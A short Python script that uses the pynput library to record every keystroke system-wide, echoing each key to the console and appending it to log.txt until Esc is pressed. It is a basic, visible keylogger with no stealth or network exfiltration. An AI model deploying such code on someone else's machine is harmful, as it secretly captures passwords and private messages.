from pynput import keyboard

# Mapping special keys to single-character Unicode symbols
special_keys = {
    keyboard.Key.space: ' ',
    keyboard.Key.backspace: '\u232b',   # ⌫
    keyboard.Key.enter: '\u23ce',       # ⏎
    keyboard.Key.tab: '\u21e5',         # ⇥
    keyboard.Key.esc: '\u238b',         # ⎋
    keyboard.Key.shift: '\u21e7',       # ⇧
    keyboard.Key.ctrl: '\u2303',        # ⌃
    keyboard.Key.alt: '\u2387',         # ⎇
    keyboard.Key.cmd: '\u2318',         # ⌘
}

def on_press(key):
    try:
        char = key.char  # for letters, numbers, and symbols
    except AttributeError:
        char = special_keys.get(key, '?')  # fallback to '?' for unknown special keys
        if char == '\u238b':
            exit()

    print(char, end='', flush=True)  # print to console

    with open("log.txt", "a", encoding="utf-8") as f:
        f.write(char)  # append to file

# Start the keyboard listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
